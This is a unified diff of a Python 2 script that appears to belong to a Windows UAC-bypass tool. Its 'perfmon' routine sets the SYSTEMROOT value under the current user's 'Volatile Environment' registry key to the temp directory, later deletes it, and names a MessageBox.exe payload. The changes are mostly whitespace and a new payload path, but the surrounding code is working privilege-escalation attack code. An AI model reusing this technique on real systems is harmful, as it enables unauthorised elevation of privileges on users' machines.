@@ -11,7 +11,7 @@ import tempfile
 from colorama import init, Fore
 init(convert=True)
 
-payload = "example_payloads\\MessageBox.exe"
+payload = "MessageBox.exe"
 
 def successBox():
 	return (Fore.GREEN + '[+]' + Fore.RESET)
@@ -29,13 +29,13 @@ def perfmon():
 	print " {} perfmon: Attempting to change %SYTEMROOT% through volatile environment".format(infoBox())
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Volatile Environment"))
+					os.path.join("Volatile Environment"))
 								
 		_winreg.SetValueEx(key,
-							"SYSTEMROOT",
-							0,
-							_winreg.REG_SZ,
-							tempfile.gettempdir())
+				"SYSTEMROOT",
+				0,
+				_winreg.REG_SZ,
+				tempfile.gettempdir())
 		_winreg.CloseKey(key)
 		print " {} perfmon: Registry %SYTEMROOT% key was created".format(successBox())
 	except Exception as error:
@@ -103,9 +103,9 @@ def perfmon():
 	print " {} perfmon: Attempting to remove %SYTEMROOT% registry key".format(infoBox())
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Volatile Environment"))
+					os.path.join("Volatile Environment"))
 		_winreg.DeleteValue(key,
-							"SYSTEMROOT")
+				"SYSTEMROOT")
 		print " {} perfmon: %SYTEMROOT% registry key was deleted".format(successBox())
 	except Exception as error:
 		print " {} perfmon: Unable to delete %SYTEMROOT% registry key: {}".format(errorBox(),error)
